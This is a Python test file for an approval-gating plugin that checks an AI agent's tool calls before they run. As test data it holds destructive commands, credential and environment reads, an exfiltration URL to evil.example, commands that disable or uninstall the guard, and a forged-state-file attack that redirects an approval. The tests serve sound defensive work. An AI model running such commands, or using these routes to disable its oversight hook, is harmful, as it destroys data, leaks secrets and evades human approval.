"""Hermes Agent pre_tool_call plugin: a fake Guardian, a fake clock, no network."""

import json

import pytest

from odingard_guardian import ExecuteResult, ReceiptsResult, RequestResult
from odingard_guardian import hermes
from odingard_guardian.hermes import (
    FINAL_CHECK_LEAD_S,
    PendingStore,
    classify_command,
    connection_for,
    decide,
    governed_call,
    make_pre_tool_call,
    register,
)

EVERYDAY = "pcn_everyday"
APPROVAL = "pcn_approval"
SECRET = "gac1.TOP-SECRET-CREDENTIAL"
ENV = {
    "GUARDIAN_AGENT_CREDENTIAL": SECRET,
    "GUARDIAN_CONNECTION_ID": EVERYDAY,
    "GUARDIAN_HOOK_ASK_CONNECTION_ID": APPROVAL,
}

ALLOW = RequestResult(ok=True, request_id="req_1", decision="ALLOW", capability_token="cap_1")
HELD = RequestResult(ok=False, request_id="req_1", reason_code="APPROVAL_REQUIRED")
PENDING = RequestResult(ok=False, request_id="req_1", reason_code="APPROVAL_PENDING")
EXPIRED = RequestResult(ok=False, request_id="req_1", reason_code="APPROVAL_EXPIRED")
DENY = RequestResult(ok=True, request_id="req_1", decision="DENY", reason_code="POLICY_DENY")


class Clock:
    def __init__(self):
        self.t = 0.0
        self.waits = []

    def now(self):
        return self.t

    def wall(self):
        return 1_000_000.0 + self.t

    def wait(self, seconds):
        self.waits.append(seconds)
        self.t += seconds


class FakeGuardian:
    """``invoke`` answers request(); ``claims`` (a list or a function of the clock) answers claim()."""

    def __init__(self, invoke=ALLOW, claims=None, execute_ok=True, clock=None, latency=None, executed=None,
                 lookup=None):
        self.invoke = invoke
        self.claims = claims if claims is not None else []
        self.execute_ok = execute_ok
        #: Overrides execute()'s answer: an ExecuteResult, or an exception to raise.
        self.execute_answer = executed
        #: Answers receipts(): a ReceiptsResult, or an exception to raise.
        self.lookup = lookup
        self.clock = clock
        self.latency = latency or {}
        self.calls = []
        self.invocations = []
        self.executed = []  # (started, finished) on the fake clock

    def _take(self, name):
        if self.clock is not None:
            self.clock.t += self.latency.get(name, 0.0)

    def request(self, invocation):
        self.calls.append("request")
        self._take("request")
        self.invocations.append(invocation)
        if isinstance(self.invoke, Exception):
            raise self.invoke
        return self.invoke

    def claim(self, request_id):
        self.calls.append(f"claim:{request_id}")
        self._take("claim")
        if callable(self.claims):
            return self.claims(self.clock.t)
        if self.claims:
            return self.claims.pop(0)
        return PENDING

    def execute(self, *, request_id, capability_token):
        self.calls.append(f"execute:{request_id}")
        began = self.clock.t if self.clock is not None else 0.0
        self._take("execute")
        self.executed.append((began, self.clock.t if self.clock is not None else 0.0))
        if isinstance(self.execute_answer, Exception):
            raise self.execute_answer
        if self.execute_answer is not None:
            return self.execute_answer
        if not self.execute_ok:
            return ExecuteResult(ok=False, reason_code="CAPABILITY_REVOKED")
        return ExecuteResult(ok=True, receipt={"schemaVersion": 1, "requestId": request_id})

    def receipts(self, request_id):
        self.calls.append(f"receipts:{request_id}")
        self._take("receipts")
        if isinstance(self.lookup, Exception):
            raise self.lookup
        if self.lookup is None:
            return ReceiptsResult(ok=False, reason_code="NOT_FOUND")
        return self.lookup


def hook(client, clock=None, env=ENV, store=None, hook_timeout_s=0, logs=None):
    clock = clock or Clock()
    return make_pre_tool_call(
        dict(env),  # the hook moves the credential out of the mapping it is given
        client=client,
        store=store if store is not None else PendingStore(),
        hook_timeout_s=hook_timeout_s,
        wait=clock.wait,
        now=clock.now,
        wall=clock.wall,
        log=(logs.append if logs is not None else (lambda _l: None)),
    )


def terminal(command):
    return {"tool_name": "terminal", "args": {"command": command}, "task_id": "t1", "session_id": "s1"}


# --- the five contract cases ---------------------------------------------------


def test_allow_redeems_then_lets_the_tool_run():
    g = FakeGuardian(ALLOW)
    assert hook(g)(**terminal("ls -la")) is None
    assert g.calls == ["request", "execute:req_1"]
    inv = g.invocations[0]
    assert inv["action"] == "tool.invoke"
    assert inv["tool_name"] == "shell"
    assert inv["connection_id"] == EVERYDAY
    assert inv["arguments"] == {"command": "ls -la"}
    assert inv["purpose"] == "Hermes: Run: ls -la"


def test_ask_then_approve_runs_only_after_the_approval():
    clock = Clock()
    g = FakeGuardian(HELD, claims=[PENDING, PENDING, ALLOW], clock=clock)
    logs = []
    assert hook(g, clock, logs=logs)(**terminal("terraform apply -auto-approve")) is None
    assert g.invocations[0]["tool_name"] == "shell_deploy"
    assert g.invocations[0]["connection_id"] == APPROVAL
    assert g.calls == ["request", "claim:req_1", "claim:req_1", "claim:req_1", "execute:req_1"]
    assert any("held for approval (request req_1)" in line for line in logs)


def test_ask_then_expire_blocks_and_never_redeems():
    g = FakeGuardian(HELD, claims=[PENDING, EXPIRED])
    out = hook(g)(**terminal("terraform apply"))
    assert out["action"] == "block"
    assert "APPROVAL_EXPIRED" in out["message"] and "Nothing ran" in out["message"]
    assert not any(c.startswith("execute") for c in g.calls)


def test_deny_blocks_and_never_redeems():
    g = FakeGuardian(DENY)
    out = hook(g)(**terminal("rm -rf /"))
    assert out == {"action": "block", "message": out["message"]}
    assert "shell_destructive" in out["message"] and "POLICY_DENY" in out["message"]
    assert g.calls == ["request"]


def test_approver_declines_blocks():
    g = FakeGuardian(HELD, claims=[RequestResult(ok=False, request_id="req_1", reason_code="APPROVAL_DENIED")])
    out = hook(g)(**terminal("git push origin main"))
    assert out["action"] == "block" and "the approver declined it" in out["message"]
    assert not any(c.startswith("execute") for c in g.calls)


# --- fail closed ---------------------------------------------------------------


@pytest.mark.parametrize(
    "env",
    [
        {},
        {"GUARDIAN_AGENT_CREDENTIAL": SECRET},
        {"GUARDIAN_CONNECTION_ID": EVERYDAY},
        {"GUARDIAN_AGENT_CREDENTIAL": "  ", "GUARDIAN_CONNECTION_ID": EVERYDAY},
    ],
)
def test_missing_config_blocks_governed_tools(env):
    out = make_pre_tool_call(env)(**terminal("ls"))
    assert out["action"] == "block" and "must be set" in out["message"]


def test_plain_http_base_url_is_refused():
    out = make_pre_tool_call({**ENV, "GUARDIAN_BASE_URL": "http://guardian.example"})(**terminal("ls"))
    assert out["action"] == "block" and "https" in out["message"]


def test_unreachable_guardian_blocks():
    # The real client turns network errors into SERVICE_UNAVAILABLE.
    g = FakeGuardian(RequestResult(ok=False, request_id="req_1", reason_code="SERVICE_UNAVAILABLE"))
    out = hook(g)(**terminal("ls"))
    assert out["action"] == "block" and "Guardian could not be reached" in out["message"]
    assert g.calls == ["request"]


def test_unreachable_guardian_through_the_real_client_blocks():
    import httpx

    from odingard_guardian import GuardianClient

    def refuse(request):
        raise httpx.ConnectError("no route", request=request)

    client = GuardianClient(credential=SECRET, transport=httpx.MockTransport(refuse))
    out = hook(client)(**terminal("ls"))
    assert out["action"] == "block" and "SERVICE_UNAVAILABLE" in out["message"]


def test_client_crash_blocks_without_leaking_the_error_text():
    g = FakeGuardian(RuntimeError(f"boom {SECRET}"))
    out = hook(g)(**terminal("ls"))
    assert out["action"] == "block" and "Nothing ran" in out["message"]
    assert SECRET not in out["message"]


def test_a_crash_anywhere_in_the_hook_blocks(monkeypatch):
    monkeypatch.setattr(hermes, "governed_call", lambda *a, **k: 1 / 0)
    out = hook(FakeGuardian(ALLOW))(**terminal("ls"))
    assert out == {"action": "block", "message": "Guardian: the check failed (ZeroDivisionError). Nothing ran."}


def test_failed_redemption_blocks():
    g = FakeGuardian(ALLOW, execute_ok=False)
    out = hook(g)(**terminal("ls"))
    assert out["action"] == "block" and "CAPABILITY_REVOKED" in out["message"]


def test_allow_without_a_capability_blocks():
    g = FakeGuardian(RequestResult(ok=True, request_id="req_1", decision="ALLOW", capability_token=None))
    out = hook(g)(**terminal("ls"))
    assert out["action"] == "block" and "MISSING_CAPABILITY" in out["message"]


def test_no_tool_name_blocks():
    assert hook(FakeGuardian())(tool_name=None, args={})["action"] == "block"


def test_hermes_hook_timeout_bounds_the_wait_and_the_redeem():
    # Hermes' default plugins.hook_callback_timeout is 30 s; it blocks the call
    # itself after that, so the hook must finish (and redeem) inside it.
    clock = Clock()
    g = FakeGuardian(HELD, claims=lambda t: PENDING, clock=clock)
    out = hook(g, clock, hook_timeout_s=30)(**terminal("terraform apply"))
    assert out["action"] == "block" and "still waiting" in out["message"]
    # The last claim starts early enough that it and the redeem (8 s each) end
    # before Hermes' deadline (30 s, less 1 s to return).
    assert clock.t <= 30 - 1 - 2 * 8


def _decide(g, clock, deadline):
    return decide(
        governed_call("terminal", {"command": "ls"}),
        client=g,
        connection_id=EVERYDAY,
        agent_name="Hermes",
        approval_timeout_s=10,
        deadline=deadline,
        call_timeout_s=8,
        now=clock.now,
        wall=clock.wall,
        wait=clock.wait,
    )


def test_nothing_is_sent_without_room_before_the_hermes_deadline():
    clock = Clock()
    g = FakeGuardian(ALLOW, clock=clock)
    verdict = _decide(g, clock, deadline=15.0)  # request + redeem need 16 s
    assert not verdict.allow and "HOOK_DEADLINE_PASSED" in verdict.reason
    assert g.calls == []


def test_a_slow_request_leaves_no_redeem_that_could_land_after_hermes_gave_up():
    clock = Clock()
    g = FakeGuardian(ALLOW, clock=clock, latency={"request": 8.5})
    verdict = _decide(g, clock, deadline=16.0)
    assert not verdict.allow and "HOOK_DEADLINE_PASSED" in verdict.reason
    assert g.calls == ["request"]


@pytest.mark.parametrize(
    "latency,approved_at",
    [
        ({"request": 7, "claim": 0.2, "execute": 6}, 20),
        ({"request": 7, "claim": 7, "execute": 7}, 18),
        ({"request": 7.9, "claim": 7.9, "execute": 7.9}, 0),
        ({"request": 0.1, "claim": 0.1, "execute": 7.9}, 12.5),
        ({"request": 3, "claim": 5, "execute": 8}, 9),
    ],
)
def test_every_redeem_finishes_inside_the_hermes_hook_timeout(latency, approved_at):
    # Hermes blocks the call at its hook timeout and abandons the worker; a
    # redeem ending after that would record a receipt for a call that never ran.
    clock = Clock()
    g = FakeGuardian(HELD, claims=lambda t: ALLOW if t >= approved_at else PENDING, clock=clock, latency=latency)
    out = hook(g, clock, hook_timeout_s=30)(**terminal("terraform apply"))
    assert clock.t <= 30
    for began, finished in g.executed:
        assert finished <= 30, (began, finished)
    if out is None:
        assert g.executed


# --- approval timing (mirrors packages/hook decide.ts) -------------------------


def test_approval_in_the_last_seconds_is_picked_up_by_the_final_check():
    clock = Clock()

    def claims(t):
        if t >= 120:
            return EXPIRED
        return ALLOW if t >= 118.0 else PENDING

    g = FakeGuardian(HELD, claims=claims, clock=clock)
    assert hook(g, clock)(**terminal("terraform apply")) is None
    assert clock.t == pytest.approx(120 - FINAL_CHECK_LEAD_S)
    assert max(clock.waits) <= 10
    assert g.calls[-1] == "execute:req_1"


def test_never_approved_blocks_without_checking_after_the_window():
    clock = Clock()
    g = FakeGuardian(HELD, claims=lambda t: EXPIRED if t >= 120 else PENDING, clock=clock)
    out = hook(g, clock)(**terminal("terraform apply"))
    assert out["action"] == "block" and "still waiting" in out["message"] and "req_1" in out["message"]
    assert clock.t < 120
    assert not any(c.startswith("execute") for c in g.calls)


def test_polls_back_off_to_ten_seconds():
    clock = Clock()
    g = FakeGuardian(HELD, claims=lambda t: PENDING, clock=clock)
    hook(g, clock)(**terminal("terraform apply"))
    assert clock.waits[0] == 2.0 and clock.waits[1] == 3.0
    assert max(clock.waits) == 10.0


def test_approval_timeout_env_shortens_the_wait():
    clock = Clock()
    g = FakeGuardian(HELD, claims=lambda t: PENDING, clock=clock)
    hook(g, clock, env={**ENV, "GUARDIAN_HERMES_APPROVAL_TIMEOUT_MS": "20000"})(**terminal("terraform apply"))
    assert clock.t <= 20


# --- an ASK that outlives one turn (one hermes chat -q per message) ------------


def test_retrying_the_same_call_in_the_same_process_claims_the_open_request():
    store = PendingStore()
    clock = Clock()
    g = FakeGuardian(HELD, claims=lambda t: PENDING, clock=clock)
    first = hook(g, clock, store=store, hook_timeout_s=30)(**terminal("terraform apply"))
    assert first["action"] == "block" and "run exactly the same action" in first["message"]
    assert g.calls.count("request") == 1

    g.claims = lambda t: ALLOW  # the person approves; the model retries in the same session
    assert hook(g, clock, store=store, hook_timeout_s=30)(**terminal("terraform apply")) is None
    assert g.calls.count("request") == 1  # no second request
    assert g.calls[-1] == "execute:req_1"
    # Used once: the next identical call is a fresh request.
    hook(g, clock, store=store, hook_timeout_s=30)(**terminal("terraform apply"))
    assert g.calls.count("request") == 2


def test_an_open_request_is_never_read_back_from_a_file_the_agent_can_write(tmp_path, monkeypatch):
    # The attack: an approval of a harmless held call (git push) is pointed, by
    # rewriting a state file under $HERMES_HOME, at a destructive call.
    home = tmp_path / "hermes"
    (home / "guardian").mkdir(parents=True)
    env = {**ENV, "HERMES_HOME": str(home), "GUARDIAN_HERMES_STATE_DIR": str(home / "guardian")}
    destroy = governed_call("terminal", {"command": "terraform destroy -auto-approve"})
    forged = {hermes._proposal_key(APPROVAL, destroy): {"request_id": "req_push", "expires_at": 9e18}}
    (home / "guardian" / "pending.json").write_text(json.dumps(forged))
    monkeypatch.setenv("HERMES_HOME", str(home))
    clock = Clock()
    # The person approved req_push (the git push); a claim of it would succeed.
    approved = {"req_push": RequestResult(ok=True, request_id="req_push", decision="ALLOW", capability_token="cap")}
    g = FakeGuardian(RequestResult(ok=False, request_id="req_new", reason_code="APPROVAL_REQUIRED"), clock=clock)
    g.claim = lambda request_id: (g.calls.append(f"claim:{request_id}"), approved.get(request_id, PENDING))[1]
    # A fresh process (one hermes chat -q per message): the hook builds its own store.
    pre = make_pre_tool_call(dict(env), client=g, hook_timeout_s=30, wait=clock.wait, now=clock.now,
                             wall=clock.wall, log=lambda _l: None)
    out = pre(**terminal("terraform destroy -auto-approve"))
    assert out["action"] == "block" and "still waiting" in out["message"]
    assert "claim:req_push" not in g.calls and not any(c.startswith("execute") for c in g.calls)
    assert g.calls[0] == "request" and g.invocations[0]["tool_name"] == "shell_deploy"


def test_the_store_has_no_file_form():
    with pytest.raises(TypeError):
        PendingStore("/tmp/pending.json")


def test_a_different_call_does_not_reuse_the_open_request():
    store = PendingStore()
    clock = Clock()
    g = FakeGuardian(HELD, claims=lambda t: PENDING, clock=clock)
    hook(g, clock, store=store, hook_timeout_s=30)(**terminal("terraform apply"))
    hook(g, clock, store=store, hook_timeout_s=30)(**terminal("terraform destroy"))
    assert g.calls.count("request") == 2


def test_an_expired_open_request_is_not_reused():
    store = PendingStore()
    clock = Clock()
    g = FakeGuardian(HELD, claims=lambda t: PENDING, clock=clock)
    hook(g, clock, store=store, hook_timeout_s=30)(**terminal("terraform apply"))
    clock.t += 500  # past the 120 s request window
    hook(g, clock, store=store, hook_timeout_s=30)(**terminal("terraform apply"))
    assert g.calls.count("request") == 2


def test_a_declined_open_request_is_forgotten():
    store = PendingStore()
    clock = Clock()
    g = FakeGuardian(HELD, claims=lambda t: PENDING, clock=clock)
    hook(g, clock, store=store, hook_timeout_s=30)(**terminal("terraform apply"))
    g.claims = lambda t: RequestResult(ok=False, request_id="req_1", reason_code="APPROVAL_DENIED")
    assert hook(g, clock, store=store, hook_timeout_s=30)(**terminal("terraform apply"))["action"] == "block"
    g.claims = lambda t: PENDING
    hook(g, clock, store=store, hook_timeout_s=30)(**terminal("terraform apply"))
    assert g.calls.count("request") == 2


def test_long_commands_differ_by_digest():
    a = governed_call("terminal", {"command": "echo " + "x" * 3000 + "; ls -la ~"})
    b = governed_call("terminal", {"command": "echo " + "x" * 3000 + "; rm -rf ~"})
    assert a.arguments["command"] == b.arguments["command"]  # the visible part is the same...
    assert a.arguments["commandDigest"] != b.arguments["commandDigest"]  # ...the proposal is not
    assert b.tool_name == "shell_destructive"


# --- routing -------------------------------------------------------------------


@pytest.mark.parametrize(
    "command,tool",
    [
        ("ls -la", "shell"),
        ("npm test", "shell"),
        ("terraform apply -auto-approve", "shell_deploy"),
        ("kubectl delete pod x", "shell_deploy"),
        ("rm -rf build", "shell_destructive"),
        ("git reset --hard HEAD~1", "shell_destructive"),
        ("DROP TABLE users;", "shell_destructive"),
        ("git push origin main", "git_push"),
        ("git push --force origin main", "shell_destructive"),
    ],
)
def test_classify_command(command, tool):
    assert classify_command(command) == tool


@pytest.mark.parametrize(
    "tool_name,args,expected",
    [
        ("write_file", {"path": "a.txt", "content": "hi"}, "file_write"),
        ("patch", {"path": "a.py", "old_string": "a", "new_string": "b"}, "file_write"),
        ("web_extract", {"urls": ["https://example.com"]}, "web_fetch"),
        ("execute_code", {"code": "print(1)"}, "code_exec"),
        ("browser_exec", {"code": "page.click()"}, "browser"),
        ("browser_cdp", {"method": "Page.navigate"}, "browser"),
        ("computer_use", {"action": "click"}, "computer_use"),
        ("cronjob_manage", {"action": "create", "schedule": "* * * * *"}, "scheduled_task"),
        ("delegate_task", {"tasks": [{"goal": "x"}]}, "delegate"),
        ("process_manage", {"action": "kill", "session_id": "p1"}, "shell"),
        ("process_manage", {"action": "write", "session_id": "p1", "data": "rm -rf /\n"}, "shell_destructive"),
        ("mcp__github__create_issue", {"title": "t"}, "mcp.github.create_issue"),
        ("mcp_github_create_issue", {"title": "t"}, "mcp.github_create_issue"),
        ("memory", {"action": "add"}, "hermes_other"),
        ("some_new_tool", {}, "hermes_other"),
    ],
)
def test_governed_tools(tool_name, args, expected):
    assert governed_call(tool_name, args).tool_name == expected


@pytest.mark.parametrize(
    "tool_name,args",
    [
        ("read_file", {"path": "x"}),
        ("search_files", {"pattern": "x"}),
        ("web_search", {"query": "x"}),
        ("process_manage", {"action": "poll", "session_id": "p1"}),
        ("cronjob_manage", {"action": "list"}),
    ],
)
def test_read_only_calls_are_not_routed(tool_name, args):
    assert governed_call(tool_name, args) is None
    # ...even with no Guardian config at all.
    assert make_pre_tool_call({})(tool_name=tool_name, args=args) is None


def test_file_contents_are_digested_not_sent():
    call = governed_call("write_file", {"path": "creds.env", "content": "API_KEY=sk-live-123"})
    assert "sk-live-123" not in json.dumps(call.arguments)
    assert call.arguments["contentDigest"].startswith("sha256:")


def test_mcp_proxy_mode_leaves_mcp_tools_to_guardian_mcp():
    assert governed_call("mcp__github__create_issue", {}, mcp="proxy") is None
    assert governed_call("terminal", {"command": "ls"}, mcp="proxy").tool_name == "shell"


def test_connection_routing_by_tier():
    assert connection_for("shell", ENV) == EVERYDAY
    assert connection_for("file_write", ENV) == EVERYDAY
    assert connection_for("shell_deploy", ENV) == APPROVAL
    assert connection_for("mcp.github.create_issue", ENV) == APPROVAL
    assert connection_for("shell_deploy", {"GUARDIAN_CONNECTION_ID": EVERYDAY}) == EVERYDAY


# --- the plugin entry point ----------------------------------------------------


def test_register_adds_one_pre_tool_call_hook(monkeypatch):
    for key, value in ENV.items():
        monkeypatch.setenv(key, value)

    class Ctx:
        hooks = []

        def register_hook(self, name, callback):
            self.hooks.append((name, callback))

    ctx = Ctx()
    register(ctx)
    assert [name for name, _ in ctx.hooks] == ["pre_tool_call"]


def test_the_credential_never_reaches_messages_or_logs():
    logs = []
    clock = Clock()
    for g in (
        FakeGuardian(DENY),
        FakeGuardian(HELD, claims=[EXPIRED], clock=clock),
        FakeGuardian(HELD, claims=lambda t: PENDING, clock=clock),
        FakeGuardian(RuntimeError(SECRET)),
    ):
        out = hook(g, clock, logs=logs)(**terminal("terraform apply"))
        assert SECRET not in json.dumps(out)
    assert all(SECRET not in line for line in logs)
    assert SECRET not in repr(hermes.GuardianClient(credential=SECRET))


# --- Guardian cannot be switched off through an everyday call -----------------

HOSTED = hermes.protected_paths({"HERMES_HOME": "/opt/data"})
PLUGIN_FILE = hermes.__file__


@pytest.mark.parametrize(
    "tool_name,args",
    [
        ("write_file", {"path": "/opt/data/config.yaml", "content": "plugins:\n  enabled: []\n"}),
        ("write_file", {"path": "/opt/data/.env", "content": "GUARDIAN_HERMES_MCP=proxy\n"}),
        ("write_file", {"path": "/opt/data/plugins/off/__init__.py", "content": ""}),
        ("write_file", {"path": "~/.hermes/config.yaml", "content": ""}),
        ("write_file", {"path": PLUGIN_FILE, "content": "def register(ctx): pass\n"}),
        ("patch", {"path": "/opt/data/config.yaml", "old_string": "- guardian", "new_string": ""}),
        ("patch", {"mode": "patch", "patch": "*** Begin Patch\n*** Update File: /opt/data/config.yaml\n"}),
        ("terminal", {"command": "sed -i 's/- guardian//' /opt/data/config.yaml"}),
        ("terminal", {"command": "sed -i 's/- guardian//' config.yaml", "workdir": "/opt/data"}),
        ("terminal", {"command": "echo GUARDIAN_BASE_URL=https://evil >> .env"}),
        ("terminal", {"command": "echo $GUARDIAN_AGENT_CREDENTIAL"}),
        ("terminal", {"command": "hermes plugins disable guardian"}),
        ("terminal", {"command": "cat ~/.hermes/.env"}),
        ("terminal", {"command": "cat /proc/self/environ"}),
        ("terminal", {"command": "pip uninstall -y odingard-guardian"}),
        ("process_manage", {"action": "write", "session_id": "p1", "data": "export HERMES_SAFE_MODE=1\n"}),
        ("read_file", {"path": "/opt/data/.env"}),
    ],
)
def test_changes_to_hermes_home_and_the_plugin_need_approval(tool_name, args):
    call = governed_call(tool_name, args, protected=HOSTED)
    assert call is not None and call.tool_name == "hermes_config"
    assert hermes.tier_of("hermes_config") == "ask"


@pytest.mark.parametrize(
    "tool_name,args,expected",
    [
        ("write_file", {"path": "/workspace/src/app.py", "content": "x"}, "file_write"),
        ("terminal", {"command": "sed -i s/a/b/ src/config.yaml"}, "shell"),
        ("read_file", {"path": "/opt/data/notes.md"}, None),
        ("read_file", {"path": "/workspace/.env"}, None),
    ],
)
def test_ordinary_work_outside_hermes_home_is_unchanged(tool_name, args, expected):
    call = governed_call(tool_name, args, protected=HOSTED)
    assert (call.tool_name if call else None) == expected


def test_the_hook_sends_a_config_edit_to_the_approval_connection():
    g = FakeGuardian(HELD, claims=[DENY])
    out = hook(g, env={**ENV, "HERMES_HOME": "/opt/data"})(
        tool_name="write_file", args={"path": "/opt/data/config.yaml", "content": "plugins: {}\n"})
    assert out["action"] == "block"
    assert g.invocations[0]["tool_name"] == "hermes_config"
    assert g.invocations[0]["connection_id"] == APPROVAL


# --- the credential stays out of tool subprocesses -----------------------------


def test_the_credential_is_moved_out_of_the_environment_but_still_used(monkeypatch):
    seen = {}

    class Client(FakeGuardian):
        def __init__(self, *, credential, **_kwargs):
            super().__init__(ALLOW)
            seen["credential"] = credential

    monkeypatch.setattr(hermes, "GuardianClient", Client)
    env = dict(ENV)
    pre = make_pre_tool_call(env, hook_timeout_s=0)
    assert "GUARDIAN_AGENT_CREDENTIAL" not in env  # tools spawned from this environment never see it
    assert pre(**terminal("ls")) is None
    assert seen["credential"] == SECRET


def test_a_credential_loaded_later_is_moved_out_too(monkeypatch):
    monkeypatch.setattr(hermes, "GuardianClient", lambda **_k: FakeGuardian(ALLOW))
    env = {k: v for k, v in ENV.items() if k != "GUARDIAN_AGENT_CREDENTIAL"}
    pre = make_pre_tool_call(env, hook_timeout_s=0)
    env["GUARDIAN_AGENT_CREDENTIAL"] = SECRET  # e.g. Hermes loads .env after the plugin
    assert pre(**terminal("ls")) is None
    assert "GUARDIAN_AGENT_CREDENTIAL" not in env


def test_register_moves_the_credential_out_of_os_environ(monkeypatch):
    import os

    for key, value in ENV.items():
        monkeypatch.setenv(key, value)

    class Ctx:
        def register_hook(self, name, callback):
            pass

    register(Ctx())
    assert "GUARDIAN_AGENT_CREDENTIAL" not in os.environ


# --- arguments Hermes coerces after the hook ------------------------------------


def test_a_non_string_command_is_governed_as_its_raw_value():
    call = governed_call("terminal", {"command": ["rm", "-rf", "/"]}, protected=HOSTED)
    assert call.tool_name == "hermes_other"
    assert call.arguments["input"] == {"command": ["rm", "-rf", "/"]}
    assert governed_call("process_manage", {"action": "write", "data": {"x": 1}}).tool_name == "hermes_other"
    assert governed_call("execute_code", {"code": 1}).tool_name == "hermes_other"


def test_a_bare_url_string_is_shown_to_the_approver():
    call = governed_call("web_extract", {"urls": "https://evil.example/?d=secret"})
    assert call.tool_name == "web_fetch" and call.arguments == {"urls": "https://evil.example/?d=secret"}
    assert governed_call("web_extract", {"urls": 7}).tool_name == "hermes_other"
    assert governed_call("web_extract", {"urls": ["https://a", 7]}).tool_name == "hermes_other"


def test_every_terminal_argument_is_part_of_the_proposal():
    plain = governed_call("terminal", {"command": "make"}, protected=HOSTED)
    more = governed_call("terminal", {"command": "make", "timeout": 600, "pty": True, "force": True},
                         protected=HOSTED)
    assert plain.arguments == {"command": "make"}
    assert more.arguments == {"command": "make", "options": {"force": True, "pty": True, "timeout": 600}}


# --- a lost redemption answer -------------------------------------------------
# The redemption reached Guardian but its answer did not come back. Guardian's
# record of the request settles it: verified runs the tool; aborted is blocked
# as EXECUTION_NOT_SENT; anything else is blocked as EXECUTION_OUTCOME_UNKNOWN.
# Nothing runs unless the redemption is confirmed.

LOST = ExecuteResult(ok=False, reason_code="HTTP_502", outcome_unknown=True)


def recorded(*states):
    return ReceiptsResult(ok=True, request_id="req_1",
                          receipts=[{"state": state, "attemptId": f"att_{i}"} for i, state in enumerate(states)])


@pytest.mark.parametrize(
    "lost",
    [
        LOST,
        ExecuteResult(ok=False, reason_code="SERVICE_UNAVAILABLE", outcome_unknown=True),
        # An older answer shape without outcome_unknown: the reason code alone says it was lost.
        ExecuteResult(ok=False, reason_code="HTTP_503"),
        ExecuteResult(ok=False, reason_code="HTTP_0"),
        RuntimeError("connection reset"),
    ],
)
def test_lost_answer_verified_by_lookup_lets_the_tool_run(lost):
    g = FakeGuardian(ALLOW, executed=lost, lookup=recorded("verified"))
    assert hook(g)(**terminal("ls")) is None
    assert g.calls == ["request", "execute:req_1", "receipts:req_1"]


def test_lost_answer_verified_by_lookup_reports_the_lookup():
    g = FakeGuardian(ALLOW, executed=LOST, lookup=recorded("aborted", "verified"))
    verdict = _decide(g, Clock(), deadline=None)
    assert verdict.allow and verdict.request_id == "req_1" and verdict.guardian_decision == "ALLOW"
    assert "its record shows the call redeemed" in verdict.reason


def test_lost_answer_after_an_approval_verified_by_lookup_runs():
    clock = Clock()
    g = FakeGuardian(HELD, claims=[PENDING, ALLOW], clock=clock, executed=LOST, lookup=recorded("verified"))
    assert hook(g, clock)(**terminal("terraform apply")) is None
    assert g.calls[-2:] == ["execute:req_1", "receipts:req_1"]


@pytest.mark.parametrize("states", [("aborted",), ("commit-rejected",), ("aborted", "commit-rejected")])
def test_lost_answer_aborted_blocks_as_not_sent(states):
    g = FakeGuardian(ALLOW, executed=LOST, lookup=recorded(*states))
    out = hook(g)(**terminal("ls"))
    assert out["action"] == "block"
    assert "(EXECUTION_NOT_SENT)" in out["message"] and "Nothing ran" in out["message"]
    assert "Do not retry" in out["message"]


@pytest.mark.parametrize(
    "lookup",
    [
        recorded(),  # nothing recorded yet
        recorded("committing"),
        recorded("aborted", "committing"),
        recorded("unexpected-state"),
        ReceiptsResult(ok=False, reason_code="SERVICE_UNAVAILABLE"),
        ReceiptsResult(ok=True, request_id="req_1", receipts="not a list"),  # type: ignore[arg-type]
        RuntimeError("lookup crashed"),
        None,  # the lookup answers NOT_FOUND
    ],
)
def test_lost_answer_not_settled_blocks_as_outcome_unknown(lookup):
    g = FakeGuardian(ALLOW, executed=LOST, lookup=lookup)
    out = hook(g)(**terminal("ls"))
    assert out["action"] == "block"
    message = out["message"]
    assert "(EXECUTION_OUTCOME_UNKNOWN)" in message and "(HTTP_502)" in message
    assert "Nothing ran. Do not retry" in message
    assert "check request req_1 in the Guardian console" in message
    assert g.calls == ["request", "execute:req_1", "receipts:req_1"]


def test_lost_answer_with_no_lookup_available_blocks_as_outcome_unknown():
    class NoLookup(FakeGuardian):
        receipts = None

    g = NoLookup(ALLOW, executed=LOST)
    verdict = _decide(g, Clock(), deadline=None)
    assert not verdict.allow and "(EXECUTION_OUTCOME_UNKNOWN)" in verdict.reason
    assert verdict.request_id == "req_1" and verdict.guardian_decision == "ALLOW"


def test_a_definitive_refusal_is_not_looked_up():
    g = FakeGuardian(ALLOW, executed=ExecuteResult(ok=False, reason_code="CAPABILITY_REVOKED"),
                     lookup=recorded("verified"))
    out = hook(g)(**terminal("ls"))
    assert out["action"] == "block" and "(CAPABILITY_REVOKED)" in out["message"]
    assert g.calls == ["request", "execute:req_1"]


def test_no_lookup_that_could_finish_after_hermes_gave_up():
    # The redeem fits before Hermes' deadline but the lookup after it would not:
    # the outcome stays unknown and the tool does not run.
    clock = Clock()
    g = FakeGuardian(ALLOW, clock=clock, latency={"request": 1, "execute": 7.6}, executed=LOST,
                     lookup=recorded("verified"))
    verdict = _decide(g, clock, deadline=16.5)
    assert not verdict.allow and "(EXECUTION_OUTCOME_UNKNOWN)" in verdict.reason
    assert g.calls == ["request", "execute:req_1"]


def _real_client(execute, receipts):
    import httpx

    from odingard_guardian import GuardianClient

    calls = []

    def answer(request):
        calls.append(request.url.path)
        body = json.loads(request.content or b"null")
        if request.url.path == "/v1/agent/requests":
            return httpx.Response(200, json={"ok": True, "decision": "ALLOW", "requestId": body["requestId"],
                                             "capabilityToken": "gcap1.TOKEN"})
        if request.url.path == "/v1/agent/execute":
            return execute(request)
        if request.url.path.startswith("/v1/agent/receipts/"):
            return receipts(request)
        return httpx.Response(404, json={"ok": False, "code": "NOT_FOUND"})

    return GuardianClient(credential=SECRET, base_url="https://guardian.test",
                          transport=httpx.MockTransport(answer)), calls


def _states(*states):
    import httpx

    def respond(request):
        return httpx.Response(200, json={"ok": True, "requestId": request.url.path.rsplit("/", 1)[-1],
                                         "receipts": [{"state": s, "attemptId": f"att_{i}"}
                                                      for i, s in enumerate(states)]})

    return respond


def _bad_gateway(request):
    import httpx

    return httpx.Response(502, text="bad gateway")


def _connection_reset(request):
    import httpx

    raise httpx.ConnectError("connection reset", request=request)


@pytest.mark.parametrize("lost", [_bad_gateway, _connection_reset])
def test_real_client_lost_answer_verified_by_lookup_runs(lost):
    client, calls = _real_client(lost, _states("verified"))
    assert hook(client)(**terminal("ls")) is None
    assert calls[:2] == ["/v1/agent/requests", "/v1/agent/execute"]
    assert calls[2].startswith("/v1/agent/receipts/")


